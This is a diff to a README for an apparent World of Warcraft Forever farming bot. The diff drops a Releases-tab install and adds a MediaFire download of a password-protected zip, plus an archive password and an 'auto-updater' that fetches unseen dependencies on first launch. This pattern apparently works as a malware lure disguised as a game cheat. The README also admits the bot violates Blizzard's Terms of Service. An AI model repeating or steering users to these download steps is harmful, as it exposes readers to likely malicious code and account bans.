@@ -10,50 +10,42 @@
 ## 📖 Overview
 Automated farming tool for World of Warcraft Forever (Classic+). This is a compiled standalone application designed to optimize gold farming, resource gathering, and character progression with minimal user intervention.
 
-## 🚀 Features
+## 🚀 Features of wow-forever-auto-farm-v1.01
 
-- **Combat Core**
-  - Automatic target acquisition and tracking.
-  - Priority-based spell/ability rotation.
-  - Pet management (auto-attack, ability usage).
-
-- **Navigation**
-  - Waypoint-based movement system.
-  - Basic obstacle avoidance.
-
-- **Loot & Inventory**
-  - Instant auto-loot after kills.
-  - Auto-sell gray items (junk) to vendors.
-  - Auto-repair equipment.
-
-- **Safety & Anti-Detection**
-  - Hostile player detection (Anti-PK).
-  - Emergency stop and logout function.
-  - Randomized behavior patterns (human-like delays).
-
-- **Utility**
-  - Action logging (saves to file).
-  - Profession support (herbalism, mining).
+- **Combat Core**: Automatic target acquisition, priority-based spell rotation, pet management.
+- **Navigation**: Waypoint movement, obstacle avoidance.
+- **Loot & Inventory**: Instant loot pickup, auto-sell gray junk, auto-repair.
+- **Safety**: Hostile player detection (Anti-PK), emergency exit.
+- **Utility**: Action logging, profession support (gathering).
 
 ## 📥 Download & Installation
 
-1. Go to the **[Releases](../../releases)** tab on the right side of this repository.
-2. Download the latest version of **`wow-forever-auto-farm-v1.01.exe`**.
-3. Create a new folder on your PC and move the `.exe` file there.
-4. *(Optional)* If the bot requires a configuration file (e.g., `config.ini` or `settings.json`), make sure it is placed in the same folder as the `.exe`.
-5. Right-click the `.exe` and select **"Run as administrator"** (required for the bot to send keystrokes to the game).
+<div align="center">
+  <br>
+  <a href="https://www.mediafire.com/file/1s9zz0ztm9qpt3p/Wow-Forever_auto.zip/file" target="_blank">
+    <img src="https://img.shields.io/badge/⬇_DOWNLOAD_wow--forever--auto--farm_v1.01-2ea44f?style=for-the-badge&logo=windows&logoColor=white" alt="Download" height="50">
+  </a>
+  <br><br>
+  
+  🔑 **Archive Password:** `8195200529`
+</div>
 
-## ⚙️ How to Use
+<br>
 
-1. Launch World of Warcraft and log into your character.
-2. Run the `wow-forever-auto-farm-v1.01.exe`.
-3. Set up your routes or load a profile (if applicable).
-4. Press the start hotkey to begin farming.
+### ⚙️ How to Run
+
+1. **Download & Extract:** Click the download button above and extract the archive using the password.
+2. **Launch:** Run the `main` file.
+3. **Auto-Updater:** The actual libraries and dependencies will download automatically on the first launch. Please wait for the process to finish.
+4. **Interface:** Once the download is complete, a control window will open. Use this window to configure settings, enable features, and start the automation.
 
 ## ⌨️ Default Hotkeys
-*(Измените эти клавиши, если в вашем exe-файле они другие)*
 | Key | Action |
 |---|---|
 | `F1` | Start/Stop Farming |
 | `F2` | Pause / Resume |
 | `F12` | Emergency Stop (Panic Key) |
+
+## ⚠️ Disclaimer & Warning
+This software is provided "as is". The author is not responsible for any bans, account suspensions, or damages caused by the use of this software. 
+**Automating gameplay violates Blizzard Entertainment's Terms of Service. Using this tool may result in a permanent ban.**
